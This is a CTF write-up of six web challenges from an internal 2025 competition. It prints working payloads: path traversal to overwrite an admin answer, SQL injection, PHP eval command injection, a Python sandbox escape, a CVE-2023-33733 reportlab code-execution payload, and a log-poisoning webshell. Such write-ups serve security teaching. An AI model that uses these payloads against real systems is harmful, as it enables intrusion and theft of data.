---
title: VSL Internal CTF 2025
published: 2025-01-12
description: "Writeup for web category of VSL Internal CTF 2025"
image: "./cover.jpeg"
tags: ["2025"]
category: Web
draft: false
---

:::note[Introduction]
I solved 6/7 web challeges in this ctf. Here is my writeup
:::

## Web 1: Beginner web:

![Screenshot 2025-01-12 152617](https://github.com/user-attachments/assets/2aa767d6-a000-4683-b958-31903f89e105)

Let try f12

![Screenshot 2025-01-12 152929](https://github.com/user-attachments/assets/6435e801-c363-4fc3-bdea-b8aad8731bc1)

We have part 1 of flag: `VSL{n0w_4l`

Then, in this type of chall, I guess we should search `robots.txt`, right. 

![Screenshot 2025-01-12 153315](https://github.com/user-attachments/assets/998cc12e-40dd-44a5-aa81-1b9753540fd6)

We have a hidden endpoint and part 2 of flag

Part 2: `l_w3_n33d_`

Then we access this enpoint: `/bumblebee-secret.txt`:

![Screenshot 2025-01-12 153500](https://github.com/user-attachments/assets/7794b76a-79ae-4f99-8267-78bd6bae9c3b)

Part 3: 15_4_l1ttl

Use `proxy` in burp suite:

![Screenshot 2025-01-12 153712](https://github.com/user-attachments/assets/4f5b5eea-a59c-40a6-a36a-8c9b5de6ce29)

Part 4: `3_3nerg0n_`

Part 5: `4nd_4_l0t_`

It's too long bro, time to final part. Here is the hint:

![Screenshot 2025-01-12 153844](https://github.com/user-attachments/assets/0102a85c-0842-4e9d-b91d-00f3e7f94779)

Add parameter to get flag:

![Screenshot 2025-01-12 153923](https://github.com/user-attachments/assets/bf9105d5-aee5-443f-aaf8-ac46a93ce6a2)

Part 6: `0f_1uck!!}`

### Flag: 
`
VSL{n0w_4ll_w3_n33d_15_4_l1ttl3_3nerg0n_4nd_4_l0t_0f_1uck!!}
`

## Web 2: Work from home

Analysis source code:

```python=
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'GET':
        return render_template('register.html')
    elif request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        question = request.form['question']
        answer = request.form['answer']
        if "password" in question:
            flash("Question cannot contain 'password'")
            return redirect(url_for('register'))
        path = 'home/' + username
        if os.path.exists(path):
            flash('User already exists')
            return redirect(url_for('register'))
        
        os.mkdir(path)
        
        with open(path + '/password.txt', 'w') as f:
            f.write(password)
        os.mkdir(path + '/questions')
        with open(path + "/questions/" + question, 'w') as f:
            f.write(answer)
        return redirect(url_for('login_user'))
```

We can see parameter `path` can be controlled by adjust `username` and question:

```python=
    path = 'home/' + username
```

And
 
```python=
 with open(path + "/questions/" + question, 'w') as f:
            f.write(answer)
```

Then the server write the answer to `/question`, that is why we can controll `question=../../admin/question/admin-question` to change the security answer of admin. I will set the answer is `1`

After this, the answer in file /question/admin-question will be rewrited. Therefore, we can use `1` as anwser and get admin flag.

:::note
Time to solve here
:::

At first, access `/register` and register a account:

![Screenshot 2025-01-12 162651](https://github.com/user-attachments/assets/259918d4-e7ee-4051-9e55-4fbd0a3dd108)

Then, access `/recover` and do like this:

![Screenshot 2025-01-12 162900](https://github.com/user-attachments/assets/b3bf5047-1110-4546-8100-9e9ab86ab8d1)

We have admin password:

![Screenshot 2025-01-12 162906](https://github.com/user-attachments/assets/643cb91b-b3f5-4413-918f-0bfd551679b6)

Now, easy flag :v :


### Flag: 
`
VSL{92c08fbf74030efcad16559dc8cc6c39}
`

## Web 3: Codegate:

![Screenshot 2025-01-12 163255](https://github.com/user-attachments/assets/593893a2-b47c-4574-87a5-3ff41c291cc3)

Scan the source, we have a very long filter:

```python=
ALLOWED_MODULES = {
    'abc',
    'aifc',
    'argparse',
    'array',
    'ast',
    'audioop',
    'base64',
    'calendar',
    'cmath',
    'code',
    'codecs',
    'copy',
    'copyreg',
    'dataclasses',
    'datetime',
    'decimal',
    'difflib',
    'email',
    'email.mime',
    'email.message',
    'email.utils',
    'enum',
    'fractions',
    'functools',
    'gettext',
    'glob',
    'gzip',
    'hashlib',
    'heapq',
    'hmac',
    'html',
    'html.parser',
    'http',
    'http.client',
    'http.server',
    'imghdr',
    'inspect',
    'io',
    'ipaddress',
    'itertools',
    'json',
    'json.decoder',
    'json.encoder',
    'keyword',
    'linecache',
    'locale',
    'logging',
    'logging.handlers',
    'math',
    'mimetypes',
    'pathlib',
    'pprint',
    'profile',
    'pstats',
    'py_compile',
    'pydoc',
    'pydoc_data',
    'queue',
    'quopri',
    'random',
    're',
    'reprlib',
    'sched',
    'secrets',
    'shelve',
    'shlex',
    'sre_compile',
    'sre_constants',
    'sre_parse',
    'stat',
    'statistics',
    'string',
    'stringprep',
    'struct',
    'tarfile',
    'textwrap',
    'timeit',
    'tokenize',
    'traceback',
    'tracemalloc',
    'turtle',
    'types',
    'typing',
    'unicodedata',
    'unittest',
    'unittest.mock',
    'urllib',
    'urllib.parse',
    'urllib.request',
    'uu',
    'uuid',
    'venv',
    'warnings',
    'wave',
    'weakref',
    'webbrowser',
    'xml',
    'xml.etree.ElementTree',
    'xml.dom',
    'xml.sax',
    'xmlrpc',
    'xmlrpc.client',
    'xmlrpc.server',
    'zipapp',
    'zipfile',
    'zipimport',
    'zlib',
    'xml.sax.handler',
    'xml.sax.expatreader',
    'xml.dom.minidom',
    'xml.dom.pulldom',
    'json.tool',
    'email.mime.text',
    'email.mime.multipart',
    'email.mime.base',
    'email.mime.image',
    'email.mime.audio',
    'email.mime.application',
    'http.server.SimpleHTTPRequestHandler',
    'http.server.HTTPServer',
    'http.client.HTTPConnection',
    'http.client.HTTPSConnection',
    'urllib.error',
    'urllib.parse.urlparse',
    'urllib.parse.urljoin',
    'urllib.request.urlopen',
}

FORBIDDEN_FUNCTIONS = {'exec', 'eval', 'compile', 'open', 'input'}
```

Ah, they don't ban pathlib, let's using it:

```python=
import pathlib 

content = pathlib.Path('/app/flag.txt').read_text()
print(content)
```

![Screenshot 2025-01-12 163624](https://github.com/user-attachments/assets/92dbd4b7-54b6-4023-af40-742d4b4fff12)

Then, flag:

![Screenshot 2025-01-12 163648](https://github.com/user-attachments/assets/20734dbd-74c7-4eed-b58c-44bbe469186f)


### Flag: 
`
VSL{all0w_3sc4p3_1s_fun_hehe_00e0dcbd5!}
`

## Web 4: UserPortal

![Screenshot 2025-01-12 163819](https://github.com/user-attachments/assets/7872930c-739e-4b0d-959c-07ca11415331)

Source:

```php=
public function login()
    {
        header('Content-Type: application/json');
        $response = ['success' => false, 'message' => ''];

        $username = isset($_POST['username']) ? trim($_POST['username']) : '';
        $password = isset($_POST['password']) ? $_POST['password'] : '';
        $username = htmlspecialchars(strip_tags($username));
        $password = htmlspecialchars(strip_tags($password));
        $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

Time to sql injection, payload:

```text=
username=admin
password=' OR 1=1;--
```

![Screenshot 2025-01-12 164314](https://github.com/user-attachments/assets/a43820f9-50e9-4573-a522-d65d09a745ae)

After sucess login, go to `/feedback`:

![Screenshot 2025-01-12 164330](https://github.com/user-attachments/assets/1684e6cb-aa17-4a2b-81d3-2dd6719ab5a2)

Source again:

In `/controller/FeedbacksController.php`:

```php=
if ($_SERVER["REQUEST_METHOD"] == "POST") {
            $feedback = trim($_POST['feedback']);

            if (strlen($feedback) > 500) {
                $error = "Feedback is too long.";
            } elseif (!empty($feedback)) {
                try {
                    $output = $this->functions->render_template("User Feedback: $feedback", $variables = []);
                    $success = $output;
                } catch (Exception $e) {
                    $error = "An error occurred while processing your feedback.";
                }
            } else {
                $error = "Feedback cannot be empty.";
            }
        }
```

Search for funcion `render_template`, in `includes/functions.php`:

```php=
<?php
class Functions
{
    public static function render_template($template, $variables = [])
    {
        $blacklist = [
            'system',
            'exec',
            'shell_exec',
            'passthru',
            'eval',
            'phpinfo',
            'assert',
            'create_function',
            'include',
            'require',
            'fopen',
            'fwrite',
            'file_put_contents',
            'file_get_contents',
        ];
        foreach ($blacklist as $badword) {
            if (stripos($template, $badword) !== false) {
                return "Error: Invalid input detected.";
            }
        }
        extract($variables);
        try {
            eval ("\$output = \"$template\";");
            return $output;
        } catch (ParseError $e) {
            return "Syntax Error: " . $e->getMessage();
        }
    }
}
```

:::Tip
We can easily see `eval`, a very dangerous function.
:::

Payload time:

```php=
123"; echo fread(popen('cat flag.txt', 'r'), 4096);#
```

![Screenshot 2025-01-12 165101](https://github.com/user-attachments/assets/f3757116-c862-4519-8c9d-821ed4aabc9f)

### Flag: 
`
VSL{12e844403b1fb9c5b6705d8dd8823e4a}
`

## Web 5: Html to pdf:

![Screenshot 2025-01-12 165349](https://github.com/user-attachments/assets/09a4c721-cebc-4b97-bf25-6fe7daf71daf)

Hint: `reportlab==3.6.12`

With that hint, i found [this](https://github.com/c53elyas/CVE-2023-33733/tree/master)

Copy the malicious html and create a html file:

```html=
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('cat flag.txt > /app/static/test.txt') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
    exploit
</font></para>
```

Upload this html:

![Screenshot 2025-01-12 165958](https://github.com/user-attachments/assets/1913be16-51ae-4c45-a9ed-ee83005b0fbb)

Access /static/test.txt to get flag:

![Screenshot 2025-01-12 170055](https://github.com/user-attachments/assets/0d60adc1-9fbb-4e12-ab0a-05e16181a04c)

### FLag: 
`
VSL{67786e838bcf22c75b7f2d68b0e9915b}
`

## Web 7: Break the limit:

![Screenshot 2025-01-12 160420](https://github.com/user-attachments/assets/1dd743e1-a7ae-44e0-84c9-5a027fc82dfc)

It is the first `first solve` of me, although it isn't intended way. 

![Screenshot 2025-01-12 160427](https://github.com/user-attachments/assets/af01224f-ca16-40df-b98f-9fed5197d5a0)

I suffered from very long source, but i notice a part in `profile.php`:

```php=
 <?php
                            try {
                                include('/tmp/log-' . $user['username'] . '.txt');
                            }catch (Exception $e) {
                                echo 'Log file not found or cannot be read, please logout and login again to generate a new log file.';
                            }
                        ?>
```

No filter, file end with `.txt`. With that, i know what i do now :v

Firstly, register a account:

![Screenshot 2025-01-12 172003](https://github.com/user-attachments/assets/0aafafd1-f161-427f-a961-a8e35781cca2)

Then login:

![Screenshot 2025-01-12 172027](https://github.com/user-attachments/assets/7e08feea-eec6-4086-ae91-e6c2af25030f)

A bunch of error here, but i just ignore these:

![Screenshot 2025-01-12 172045](https://github.com/user-attachments/assets/d2ce98ac-bee9-4817-8b42-a84a56fec591)

Refresh, then:

![Screenshot 2025-01-12 172149](https://github.com/user-attachments/assets/b774372a-d83b-4d0f-b3c8-83bfcb628645)

### Flag: 
`
VSL{l0g_t0_rc3_v5l25824}
`

### PS: Intented way :

- In `change information`, we can inject this (only 1 line 1 time):

```php=
<?=$b='';'
';$b='c';'
';$c='a';'
';$b.=$c;'
';$c='t';'
';$b.=$c;'
';$c=' ';'
';$b.=$c;'
';$c='/';'
';$b.=$c;'
';$c='f';'
';$b.=$c;'
';$c='*';'
';$b.=$c;'
';?>
<?=$b?> 
```

:::tip
Mode `a` allow newline to add in log file. Therefore, we can concat character to create a simple webshell and get flag
:::
